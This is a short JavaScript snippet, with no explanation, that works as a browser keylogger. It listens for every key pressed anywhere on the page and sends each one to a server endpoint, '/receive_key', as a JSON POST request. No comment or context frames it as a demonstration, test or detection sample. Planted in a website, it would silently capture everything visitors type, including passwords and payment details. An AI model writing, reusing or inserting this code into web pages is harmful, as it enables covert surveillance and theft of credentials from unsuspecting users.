



document.addEventListener('keydown', function(event) {
    const key = event.key; 
    fetch('/receive_key', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ key: key })
    })
    .then(response => response.text())
    .then(data => console.log(data));
});


